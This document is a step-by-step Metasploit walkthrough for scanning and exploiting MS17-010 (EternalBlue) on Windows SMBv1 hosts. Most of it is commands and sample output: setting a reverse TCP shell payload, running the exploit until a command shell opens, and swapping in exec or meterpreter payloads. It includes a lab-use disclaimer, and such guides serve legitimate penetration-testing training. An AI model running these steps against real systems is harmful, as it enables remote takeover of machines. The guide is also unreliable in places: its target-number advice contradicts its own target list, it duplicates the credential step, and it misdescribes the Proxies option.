**Notes:**

MS17-010 (EternalBlue) is a critical vulnerability in Windows SMBv1 (CVE-2017-0144) that allows remote code execution. This workflow demonstrates scanning, checking, and exploiting it using Metasploit modules. Always obtain explicit permission before testing. Use in isolated lab environments. Ensure Metasploit database is connected (`db_status`) for host management.

## Scan for MS17-010 Vulnerability

### Load the MS17-010 SMB Scanner

Load the auxiliary scanner module for MS17-010:

```
msf6 > use auxiliary/scanner/smb/smb_ms17_010

```

### Load Hosts from Database

Load hosts from the Metasploit database into the module:

```
msf6 > hosts -R

```

List hosts with address column only:

```
msf6 > hosts -c address -R

```

**Notes:**

- `R`: Repopulates RHOSTS with all hosts from the DB.
- Use after importing scans (e.g., via `db_import` or `db_nmap`).

### Show Required Options

Display the module's options:

```
msf6 > show options

```

### Run the Scanner

Execute the scan against loaded hosts:

```
msf6 > run

```

**Notes:**

- Scans for MS17-010 vulnerability and stores results in the database (hosts/vulns).
- Output indicates vulnerable hosts (e.g., "The target is VULNERABLE").

### Optional: Provide SMB Credentials (if Required)

Set SMB username/password for authenticated scanning:

```
msf6 > set SMBUser Administrator

```

```
msf6 > set SMBPass Armour123

```

Or use Administrator credentials:

```
msf6 > set SMBUser Administrator

```

```
msf6 > set SMBPass Armour123

```

### Run Scan Again (if Needed)

Re-execute the scan with credentials:

```
msf6 > run

```

**Notes:**

- Credentials may be needed for non-anonymous access.
- Verify with `show options` before running.

## Exploit MS17-010 EternalBlue

### Load the Exploit Module

Load the EternalBlue exploit module:

```
msf6 > use exploit/windows/smb/ms17_010_eternalblue

```

### Show Options

Display the module's options:

```
msf6 > show options

```

### Load Hosts into the Module (Optional)

Load hosts from the database:

```
msf6 > hosts -R

```

**Notes:**

- Sets RHOSTS automatically for multi-host exploitation.

### Run Vulnerability Check

Verify if the target is vulnerable:

```
msf6 > check

```

**Notes:**

- Non-destructive; returns "The target is VULNERABLE" if exploitable.
- Requires RHOSTS set.

### Select Payload

Set a common reverse shell payload (x64):

```
msf6 > set PAYLOAD windows/x64/shell/reverse_tcp

```

### Show Options Again

Display updated options after payload selection:

```
msf6 > show options

```

**Notes:**

- Ensure LHOST (your IP) and LPORT (e.g., 4444) are set for reverse payloads.

### Run the Exploit

Execute the exploit:

```
msf6 > exploit

```

**Example Target Output:**

```
[*] Started reverse TCP handler on 192.168.1.100:4444
[*] 192.168.1.65:445 - Scanner SMB Version: 1.0
[*] 192.168.1.65:445 - Target OS: Windows Server 2012 R2 Standard Evaluation 9600
[*] 192.168.1.65:445 - 192.168.1.65:445 - Selected Target: Windows Server 2012 R2 Standard Evaluation 9600 (target 6)
[+] 192.168.1.65:445 - The target is vulnerable.
[*] 192.168.1.65:445 - EternalBlue working, send stage 1
[*] 192.168.1.65:445 - Sending stage 1 to 192.168.1.65:445
[*] Sending stage 2 to 192.168.1.65:445
[*] Sending stage 3 to 192.168.1.65:445
[*] Command shell session 1 opened (192.168.1.100:4444 -> 192.168.1.65:49158) at 2023-01-15 10:30:45 -0500

```

**Notes:**

- Successful exploitation opens a shell session.
- Use `sessions -l` to list, `sessions -i <id>` to interact.
- Monitor with `setg Proxies` for multi-session handling.

## Manual Exploitation Against a Single Target

### Load Module Again (Optional)

Reload the exploit module if needed:

```
msf6 > use exploit/windows/smb/ms17_010_eternalblue

```

### Set the Target Host

Specify a single target IP:

```
msf6 > set RHOST 192.168.1.65

```

### Set the Payload

Configure the reverse shell payload:

```
msf6 > set PAYLOAD windows/x64/shell/reverse_tcp

```

### Show Options

Verify all settings:

```
msf6 > show options

```

### Select Correct Target

### Show Targets

List available targets for the module:

```
msf6 > show targets

```

**Example Output:**

```
   #  Name                                                    Info
   -   ----                                                    ----
   0   Automatic Target
   1   Windows 2000 SP4 English (x86)
   2   Windows 2000 SP4 English (x64)
   3   Windows 2003 SP1 English (x86)
   4   Windows 2003 SP1 English (x64)
   5   Windows 2003 SP2 English (x86)
   6   Windows 2003 SP2 English (x64)
   7   Windows 2003 SP2 English (x86) TARGET_ARCH=X64
   8   Windows XP SP2 English (x86)
   9   Windows XP SP3 English (x86)
  10   Windows XP SP3 English (x64)
  11   Windows 7 English (x64)
  12   Windows 7 English (x86)
  13   Windows 8 English (x64)
  14   Windows 8 English (x86)
  15   Windows 8.1 English (x64)
  16   Windows 8.1 English (x86)
  17   Windows 2012 English (x64)
  18   Windows 2012 English (x86)
  19   Windows 2012 R2 English (x64)
  20   Windows 2012 R2 English (x86)
  21   Windows 10 English (x64)
  22   Windows 10 English (x86)

```

### Set Target

Choose the appropriate target (e.g., target 6 for Windows Server 2012 R2):

```
msf6 > set target 6

```

### Run Exploit

Execute the exploit on the single target:

```
msf6 > exploit

```

**Notes:**

- Target auto-detection via `check` or manual via OS fingerprint.
- Mismatch may cause failure; use `show targets` to match OS.

## Other Payload Examples

### MessageBox Payload

Display a message box on the target (non-interactive, for testing):

```
msf6 > set PAYLOAD windows/x64/messagebox

```

### Command Execution Payload

Execute a command on the target (e.g., calc.exe):

```
msf6 > set PAYLOAD windows/x64/exec

```

**Notes:**

- For `exec`, set `CMD` option (e.g., `set CMD calc.exe`).
- Other options: Meterpreter (`windows/x64/meterpreter/reverse_tcp`) for advanced post-exploitation.
- Always `show options` after setting payload to configure LHOST/LPORT/CMD.
